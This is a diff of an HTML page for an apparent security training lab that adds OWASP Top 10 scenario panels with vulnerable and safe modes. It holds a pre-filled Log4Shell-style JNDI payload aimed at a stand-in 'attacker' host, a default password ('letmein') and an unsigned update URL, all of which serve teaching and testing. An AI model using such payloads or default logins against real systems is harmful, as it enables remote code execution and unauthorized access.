@@ -82,6 +82,20 @@
       </div>
     </section>
 
+    <section class="panel lab-panel crypto-panel">
+      <div class="panel-header">
+        <div>
+          <p class="eyebrow">Scenario runner</p>
+          <h2>A02 cryptographic failures</h2>
+        </div>
+        <span class="badge badge-muted">Secret exposure</span>
+      </div>
+      <p>
+        In vulnerable mode, the endpoint returns plaintext secret material. In safe mode, the secret is redacted.
+      </p>
+      <button id="runCryptoProof" class="button button-danger" type="button">Run A02 secret export</button>
+    </section>
+
     <section class="panel lab-panel injection-panel">
       <div class="panel-header">
         <div>
@@ -103,6 +117,20 @@
           <button id="runSqlInjection" class="button button-danger" type="button">Run SQL injection</button>
         </div>
       </div>
+    </section>
+
+    <section class="panel lab-panel design-panel">
+      <div class="panel-header">
+        <div>
+          <p class="eyebrow">Scenario runner</p>
+          <h2>A04 insecure design</h2>
+        </div>
+        <span class="badge badge-muted">Approval bypass</span>
+      </div>
+      <p>
+        In vulnerable mode, the business workflow grants emergency access without approval. In safe mode, approval is required.
+      </p>
+      <button id="runDesignProof" class="button button-danger" type="button">Run A04 approval bypass</button>
     </section>
 
     <section class="panel lab-panel object-storage-panel">
@@ -131,6 +159,80 @@
           <button id="readCustomObject" class="button button-secondary" type="button">Fetch S3 object</button>
         </div>
       </div>
+    </section>
+
+    <section class="panel lab-panel components-panel">
+      <div class="panel-header">
+        <div>
+          <p class="eyebrow">Scenario runner</p>
+          <h2>A06 vulnerable components</h2>
+        </div>
+        <span class="badge badge-muted">Legacy renderer</span>
+      </div>
+      <p>
+        In vulnerable mode, a simulated legacy renderer accepts an exploit marker and exposes component metadata.
+      </p>
+      <div class="custom-request">
+        <label for="componentPayload">Exploit marker</label>
+        <div class="input-row">
+          <input id="componentPayload" type="text" spellcheck="false" value="${jndi:ldap://attacker/lab}">
+          <button id="runComponentProof" class="button button-danger" type="button">Run A06 component exploit</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="panel lab-panel auth-panel">
+      <div class="panel-header">
+        <div>
+          <p class="eyebrow">Scenario runner</p>
+          <h2>A07 identification and authentication failures</h2>
+        </div>
+        <span class="badge badge-muted">Default password</span>
+      </div>
+      <p>
+        In vulnerable mode, the lab admin endpoint accepts a default password. In safe mode, default credentials are rejected.
+      </p>
+      <div class="custom-request">
+        <label for="defaultPassword">Password</label>
+        <div class="input-row">
+          <input id="defaultPassword" type="text" spellcheck="false" value="letmein">
+          <button id="runAuthProof" class="button button-danger" type="button">Run A07 default login</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="panel lab-panel integrity-panel">
+      <div class="panel-header">
+        <div>
+          <p class="eyebrow">Scenario runner</p>
+          <h2>A08 software and data integrity failures</h2>
+        </div>
+        <span class="badge badge-muted">Unsigned update</span>
+      </div>
+      <p>
+        In vulnerable mode, the update workflow trusts an unsigned plugin package URL. In safe mode, unsigned packages are rejected.
+      </p>
+      <div class="custom-request">
+        <label for="packageUrl">Package URL</label>
+        <div class="input-row">
+          <input id="packageUrl" type="text" spellcheck="false" value="http://updates.local/unsigned-plugin.zip">
+          <button id="runIntegrityProof" class="button button-danger" type="button">Run A08 unsigned update</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="panel lab-panel logging-panel">
+      <div class="panel-header">
+        <div>
+          <p class="eyebrow">Scenario runner</p>
+          <h2>A09 logging and monitoring failures</h2>
+        </div>
+        <span class="badge badge-muted">Missing telemetry</span>
+      </div>
+      <p>
+        In vulnerable mode, a sensitive export completes without a CloudWatch detection event. This scenario is confirmed by the missing alert.
+      </p>
+      <button id="runLoggingProof" class="button button-danger" type="button">Run A09 unlogged export</button>
     </section>
 
     <section class="panel lab-panel ssrf-panel">
@@ -165,7 +267,7 @@
         <button id="loadCloudDetections" class="button button-secondary" type="button">Analyze logs</button>
       </div>
       <p>
-        A01, A03 and A05 write security events into LocalStack CloudWatch Logs. This view reads those logs and shows which events would become detection alerts.
+        Vulnerable scenarios write security events into LocalStack CloudWatch Logs, except A09 in vulnerable mode, where the missing event is the evidence of the logging failure.
       </p>
       <div id="detectionsList" class="empty-state">Run scenarios, then analyze cloud logs.</div>
     </section>
